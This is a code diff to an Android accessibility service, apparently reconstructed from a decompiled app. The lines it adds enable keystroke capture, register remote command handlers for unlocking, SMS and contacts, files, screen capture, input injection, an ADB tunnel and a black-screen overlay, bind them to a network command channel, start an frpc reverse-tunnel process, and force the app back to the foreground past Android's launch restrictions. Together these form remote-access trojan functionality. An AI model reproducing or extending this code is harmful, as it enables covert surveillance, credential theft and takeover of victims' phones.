@@ -49,6 +49,7 @@ import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
 import com.storm.safe.rock.service.modules.SmsContentObserver
 import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
 import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
+import com.storm.safe.rock.service.modules.FrpcProcessManager
 import com.storm.safe.rock.util.AssetConfigReader
 import java.util.Locale
 import java.util.concurrent.atomic.AtomicBoolean
@@ -298,6 +299,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** JADX: f52382b3 (C0322a7) — Remote config */
     var remoteConfigManager: RemoteConfigManager? = null
+
+    /** frpc 进程管理器 — vendor CheckProcessThread (thread/b.java) */
+    var frpcProcessManager: FrpcProcessManager? = null
 
     /** JADX: f52414e5 (C0614i9) — Event filtering.
      *  Vendor: C0614i9 — EventFilterManager, now replicated. */
@@ -592,6 +596,12 @@ class MyAccessibilityService : AccessibilityService() {
         super.onServiceConnected()
         android.util.Log.i(TAG, "✅ [服务] 无障碍服务已连接")
 
+        // Initialize ActivityMonitor log directory to app-private storage
+        // Android 11+ Scoped Storage blocks direct /sdcard/ writes
+        try {
+            ActivityMonitor.logDir = filesDir
+        } catch (_: Exception) {}
+
         try {
             ActivityMonitor.logSystem("无障碍服务已启动连接")
         } catch (_: Exception) {}
@@ -797,6 +807,14 @@ class MyAccessibilityService : AccessibilityService() {
                 }
                 som.filterAccessibilityEvent(event)
             } catch (_: Exception) {}
+
+            // ── C0320a5 dispatch: keystroke capture, app usage, notifications ──
+            // JADX: dispatches to C0320a5.m211582a3 for event types 16, 32, 64
+            if (eventType == 16 || eventType == 32 || eventType == 64) {
+                try {
+                    eventFilterManager?.keystrokeCapture?.handleEvent(event, null)
+                } catch (_: Exception) {}
+            }
 
             // ── Permission request guard (JADX line 9848) ──
             if (isPermissionRequestActive() || isWebViewOpen) return
@@ -1180,6 +1198,12 @@ class MyAccessibilityService : AccessibilityService() {
             // JADX: C0614i9 — EventFilterManager cleanup, null out reference
             eventFilterManager?.release()
             eventFilterManager = null
+        } catch (_: Exception) {}
+
+        // Cleanup frpc process manager
+        try {
+            frpcProcessManager?.stop()
+            frpcProcessManager = null
         } catch (_: Exception) {}
 
         // Cleanup biometric bypass
@@ -3146,6 +3170,39 @@ class MyAccessibilityService : AccessibilityService() {
         try {
             val cmdContext = com.storm.safe.rock.service.modules.command.CommandContext(this, networkManager)
             commandDispatcher = CommandDispatcher(cmdContext)
+
+            // Register all 15 command handlers
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AppCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.UnlockCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.FileCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.MediaCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.SmsContactsCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.LogCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DetectionCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.DeviceStateCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.AdbTunnelCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.InputCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ScreenCaptureCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.ProtectionCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.PermissionCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.GestureCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.CipherReplayCommandHandler())
+            commandDispatcher!!.registerHandler(com.storm.safe.rock.service.modules.command.BlackScreenCommandHandler())
+            android.util.Log.d(TAG, "已注册 16 个命令处理器")
+
+            // Bind commandCallback to dispatch commands via CommandDispatcher
+            val dispatcher = commandDispatcher!!
+            networkManager?.commandCallback = { json ->
+                coroutineScope?.launch(Dispatchers.IO) {
+                    try {
+                        dispatcher.dispatch(json)
+                    } catch (e: Exception) {
+                        android.util.Log.e(TAG, "命令分发失败", e)
+                    }
+                }
+            }
+            android.util.Log.d(TAG, "✅ commandCallback 已绑定到 CommandDispatcher")
+
             android.util.Log.d(TAG, "✅ 命令分发器初始化完成")
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ CommandDispatcher 延迟初始化失败", e)
@@ -3154,11 +3211,22 @@ class MyAccessibilityService : AccessibilityService() {
         // JADX: RemoteConfigManager (LocalHttpServer) — C0322a7
         try {
             val rcm = RemoteConfigManager(applicationContext)
+            rcm.commandDispatcher = commandDispatcher
             rcm.start()
             remoteConfigManager = rcm
             android.util.Log.d(TAG, "✅ RemoteConfigManager 已启动 (port=${RemoteConfigManager.DEFAULT_PORT})")
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ RemoteConfigManager 启动失败", e)
+        }
+
+        // frpc 进程管理器 — vendor unlockedInstance() CheckProcessThread
+        try {
+            val fpm = FrpcProcessManager(applicationContext)
+            fpm.start()
+            frpcProcessManager = fpm
+            android.util.Log.d(TAG, "✅ FrpcProcessManager 已启动")
+        } catch (e: Exception) {
+            android.util.Log.e(TAG, "❌ FrpcProcessManager 启动失败", e)
         }
 
         // JADX: request initial config from server
@@ -3660,9 +3728,24 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** JADX: m211472h7 — 检测当前是否在自己的 app */
     private fun isCurrentlyInOurApp(): Boolean {
-        return try {
-            rootInActiveWindow?.packageName?.toString() == packageName
-        } catch (_: Exception) { false }
+        // Method 1: rootInActiveWindow（快但不可靠，可能返回旧窗口）
+        try {
+            if (rootInActiveWindow?.packageName?.toString() == packageName) return true
+        } catch (_: Exception) {}
+        // Method 2: 遍历 windows 查找我们的 app 窗口是否 active
+        try {
+            for (w in windows ?: emptyList()) {
+                if (w.isActive && w.root?.packageName?.toString() == packageName) return true
+            }
+        } catch (_: Exception) {}
+        // Method 3: 检查 Activity 引用是否存在且未销毁
+        try {
+            val act = com.storm.safe.rock.iuzxujjtqev.getCurrentActivity()
+            if (act != null && !act.isFinishing && !act.isDestroyed) {
+                if (act.hasWindowFocus()) return true
+            }
+        } catch (_: Exception) {}
+        return false
     }
 
     /**
@@ -3670,37 +3753,65 @@ class MyAccessibilityService : AccessibilityService() {
      * 先启动 Activity，再最多 6 次 BACK + 稳定性验证。
      */
     private suspend fun smartReturnToAppGeneric(brand: String, sdk: Int): Boolean {
-        // Step 1: 启动 iuzxujjtqev Activity
+        val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
+            putExtra("SMART_RETURN_BACKUP", true)
+            putExtra("FROM_ACCESSIBILITY_SERVICE", true)
+        }
+
+        // Phase 0: moveTaskToFront（最可靠 — 绕过 BAL 限制，走 REORDER_TASKS 权限路径）
         try {
-            val intent = Intent(this, com.storm.safe.rock.iuzxujjtqev::class.java).apply {
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
-                putExtra("SMART_RETURN_BACKUP", true)
-                putExtra("FROM_ACCESSIBILITY_SERVICE", true)
+            val am = getSystemService(android.content.Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
+            // Strategy A: AppTask.moveToFront
+            am?.appTasks?.forEach { task ->
+                try {
+                    if (task.taskInfo?.baseActivity?.packageName == packageName) {
+                        task.moveToFront()
+                        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: AppTask.moveToFront")
+                    }
+                } catch (_: Exception) {}
             }
+            kotlinx.coroutines.delay(1000L)
+            if (isCurrentlyInOurApp()) {
+                android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 AppTask 成功")
+                return true
+            }
+            // Strategy B: moveTaskToFront(taskId)
+            val taskId = com.storm.safe.rock.iuzxujjtqev.lastKnownTaskId
+            if (taskId > 0) {
+                am?.moveTaskToFront(taskId, android.app.ActivityManager.MOVE_TASK_WITH_HOME)
+                android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase0: moveTaskToFront(taskId=$taskId)")
+                kotlinx.coroutines.delay(1000L)
+                if (isCurrentlyInOurApp()) {
+                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase0 taskId 成功")
+                    return true
+                }
+            }
+        } catch (e: Exception) {
+            android.util.Log.w(TAG, "🏠 [smartReturnToApp] Phase0 失败: ${e.message}")
+        }
+
+        // Phase 1: startActivity（简单场景有效）
+        try {
             startActivity(intent)
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] iuzxujjtqev已启动")
+            android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase1: startActivity")
         } catch (e: Exception) {
             android.util.Log.e(TAG, "❌ [smartReturnToApp] 启动Activity失败: ${e.message}", e)
         }
-
         kotlinx.coroutines.delay(2000L)
-
-        // Step 2: 检测是否已在 app
-        val isInApp = try { rootInActiveWindow?.packageName?.toString() == packageName } catch (_: Exception) { false }
-        if (isInApp) {
-            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ 已在app")
+        if (isCurrentlyInOurApp()) {
+            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase1 成功")
             return true
         }
 
-        // Step 3: 最多 6 次 BACK + 稳定性验证
+        // Phase 2: BACK 回退兜底
+        android.util.Log.d(TAG, "🏠 [smartReturnToApp] Phase2: BACK循环")
         val backDelay = if (brand.contains("vivo") && sdk >= 31) 1000L else 500L
         for (i in 0 until 6) {
-            val currentPkg = try { rootInActiveWindow?.packageName?.toString() ?: "" } catch (_: Exception) { "" }
-            if (currentPkg == packageName) {
+            if (isCurrentlyInOurApp()) {
                 kotlinx.coroutines.delay(backDelay)
-                val stillInApp = try { rootInActiveWindow?.packageName?.toString() == packageName } catch (_: Exception) { false }
-                if (stillInApp) {
-                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ BACK第${i}次后稳定在app")
+                if (isCurrentlyInOurApp()) {
+                    android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase2 BACK第${i}次后稳定在app")
                     return true
                 }
             }
@@ -3708,8 +3819,15 @@ class MyAccessibilityService : AccessibilityService() {
             android.util.Log.d(TAG, "🏠 [smartReturnToApp] BACK第${i + 1}次")
             kotlinx.coroutines.delay(backDelay)
         }
+        // 最后再试一次 startActivity
+        try { startActivity(intent) } catch (_: Exception) {}
+        kotlinx.coroutines.delay(2000L)
+        if (isCurrentlyInOurApp()) {
+            android.util.Log.d(TAG, "🏠 [smartReturnToApp] ✅ Phase3 最终startActivity成功")
+            return true
+        }
 
-        android.util.Log.w(TAG, "🏠 [smartReturnToApp] ❌ 6次BACK后仍未回到app")
+        android.util.Log.w(TAG, "🏠 [smartReturnToApp] ❌ 全部策略失败")
         return false
     }
 
